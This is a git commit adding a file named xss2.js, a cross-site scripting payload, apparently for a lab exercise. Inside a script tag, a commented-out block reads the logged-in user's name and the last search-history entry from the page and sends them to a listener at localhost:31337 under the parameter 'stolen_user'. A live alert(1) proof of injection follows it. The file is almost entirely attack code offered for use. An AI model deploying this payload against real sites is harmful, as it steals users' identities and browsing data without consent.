ffc9137d1711749219ac64fd8694ec4fd8c50be6
GiantDwarfRen <114264732+GiantDwarfRen@users.noreply.github.com>
2024-05-09 16:26:12 -0700

    Init

---
+++ xss2.js
@@ -0,0 +1,11 @@
+<script>
+{/* $( document ).ready(function() {
+    const loggedInUser = document.getElementById('logged-in-user').textContent;
+    const lastRecord = document.getElementById('history-list').children[1].textContent;
+    const xhr = new XMLHttpRequest();
+    var url = "http://localhost:31337/?stolen_user=" + encodeURIComponent(loggedInUser) + "&last_search=" + encodeURIComponent(lastRecord);
+    xhr.open("GET", url);
+    xhr.send();
+}); */}
+alert(1);
+</script>
